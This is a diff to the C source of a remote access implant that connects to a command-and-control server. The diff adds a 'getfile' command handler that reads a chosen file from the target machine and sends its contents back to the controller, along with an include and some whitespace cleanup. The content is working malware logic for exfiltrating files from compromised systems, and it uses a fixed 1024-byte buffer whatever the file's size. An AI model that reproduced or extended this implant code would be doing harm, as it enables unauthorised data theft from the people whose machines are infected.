@@ -10,6 +10,7 @@
 
 #include "Common.h"
 #include "Disconnect.h"
+#include "File.h"
 
 
 // Callout and establish connection to C2
@@ -117,6 +118,20 @@ int handleCommands(int* client_fd)
 
             case getfile:
                 printf("Received getfile command!\n");
+                uint64_t filesize = 0;
+                char filebytes [1024];
+
+                // Get file contents
+                if (!handleGetFile(command->getfilecommand.filepath, &filesize, filebytes))
+                {
+                    printf("Failed to get file from target\n");
+                }
+
+                // Send our response
+                if (!sendFileContents(client_fd, filesize, filebytes))
+                {
+                    printf("Failed to send file contents to C2\n");
+                }
                 break;
 
             case putfile:
@@ -161,9 +176,6 @@ int main()
         printf("Failed handling commands from C2!\n");
         
     }
-
-    
-
 
     return 0;
 
